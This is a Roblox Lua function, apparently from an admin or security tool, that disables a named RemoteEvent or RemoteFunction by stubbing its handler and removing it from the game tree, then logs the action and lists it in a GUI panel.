function firewallRemote(entry)
    local rem = entry.inst
    if not rem or not rem.Parent then
        log("WARN","Firewall skip — already gone: "..(entry.path or "?"))
        return
    end
    local ok, err = pcall(function()
        if rem:IsA("RemoteEvent") then
            rem.OnServerEvent:Connect(function() end)
        elseif rem:IsA("RemoteFunction") then
            rem.OnServerInvoke = function() return nil end
        end
        rem.Parent = nil
    end)
    if ok then
        local fw = {path=entry.path, class=entry.class, time=ts()}
        S.firewalled[#S.firewalled+1] = fw
        log("OK","Firewalled: "..entry.path)

        local row = Instance.new("Frame")
        row.Size = UDim2.new(1,-8,0,24)
        row.BackgroundColor3 = Color3.fromRGB(14,26,14)
        row.BorderSizePixel = 0
        row.Parent = FWList
        mkCorner(row, 4)

        local fc = mkLbl(row, "["..fw.class.."]", 11, T.OK, Enum.Font.Code); fc.Size=UDim2.new(0,120,1,0); fc.Position=UDim2.new(0,6,0,0)
        local fp = mkLbl(row, fw.path, 11, T.TXT, Enum.Font.Code); fp.Size=UDim2.new(0,360,1,0); fp.Position=UDim2.new(0,130,0,0)
        local ft = mkLbl(row, fw.time, 11, T.TXM, Enum.Font.Code); ft.Size=UDim2.new(0,80,1,0); ft.Position=UDim2.new(0,500,0,0)
    else
        log("WARN","Firewall failed "..entry.path..": "..tostring(err))
    end
end

